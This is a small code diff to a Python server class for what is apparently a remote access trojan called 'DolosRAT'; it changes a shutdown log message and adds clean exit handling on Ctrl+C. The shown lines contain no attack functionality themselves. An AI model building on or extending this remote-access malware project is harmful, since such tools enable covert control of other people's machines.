@@ -100,7 +100,7 @@ class DolosServer:
 
         # Write log to inform of shutting down.
         self._logger.write_log(
-            "DolosRAT shutting down.", 
+            "DolosRAT shutting down. Please wait.", 
             LoggerLevel.WARNING
         )
 
@@ -187,8 +187,12 @@ class DolosServer:
         the primary logic (_run()).
         """
 
-        # Initialise.
-        self._run()
+        try:
+            # Initialise.
+            self._run()
+        except (RuntimeError, KeyboardInterrupt):
+            # CTRL+C, exit.
+            sys.exit(0)
 
 if __name__ == '__main__':
 
